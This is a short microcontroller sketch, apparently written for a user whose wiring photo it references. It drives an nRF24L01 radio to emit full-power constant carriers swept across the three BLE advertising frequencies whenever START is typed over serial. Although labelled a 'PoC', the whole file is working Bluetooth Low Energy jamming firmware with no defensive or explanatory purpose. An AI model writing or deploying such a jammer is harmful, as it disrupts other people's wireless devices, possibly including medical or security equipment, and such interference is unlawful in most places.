#include <SPI.h>
#include <RF24.h>

// Control Pins (Perfectly aligned to your photo)
#define CE_PIN   9   // Orange wire on IO9
#define CSN_PIN 10   // Yellow wire on IO10

// SPI Hardware Pins (Perfectly aligned to your photo)
#define SPI_SCK  12  // Green wire on IO12
#define SPI_MISO 13  // Purple wire on IO13
#define SPI_MOSI 11  // Blue wire on IO11

RF24 radio(CE_PIN, CSN_PIN);

const uint8_t ble_channels[] = {2, 26, 80}; 
bool isActive = false; 

void printMenu() {
  Serial.println("\n=== BLE Protocol PoC Controller ===");
  Serial.println("Type 'START' to activate transmission.");
  Serial.println("Type 'STOP' to pause transmission.");
  Serial.println("====================================");
}

void setup() {
  Serial.begin(115200);
  delay(1000); 
  
  // Initializes the SPI bus using the exact hardware layout from your photo
  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, CSN_PIN);
  
  if (!radio.begin()) {
    Serial.println("[-] Hardware error: nRF24L01 not responding! Check your wiring.");
    while (1); 
  }

  radio.setAutoAck(false);
  radio.stopListening();
  radio.setDataRate(RF24_250KBPS); 
  radio.setPALevel(RF24_PA_MAX);  
  
  printMenu();
}

void loop() {
  if (Serial.available() > 0) {
    String command = Serial.readStringUntil('\n');
    command.trim(); 
    command.toUpperCase(); 

    if (command == "START") {
      isActive = true;
      Serial.println("[+] PoC Started: Sweeping BLE channels active.");
    } 
    else if (command == "STOP") {
      isActive = false;
      radio.stopConstCarrier(); 
      Serial.println("[-] PoC Stopped: Transmitter placed in IDLE.");
      printMenu();
    }
  }

  if (isActive) {
    for (int i = 0; i < 3; i++) {
      uint8_t target_channel = ble_channels[i];
      radio.setChannel(target_channel);
      radio.startConstCarrier(RF24_PA_MAX, target_channel);
      delayMicroseconds(400); 
      radio.stopConstCarrier(); 
    }
  }
}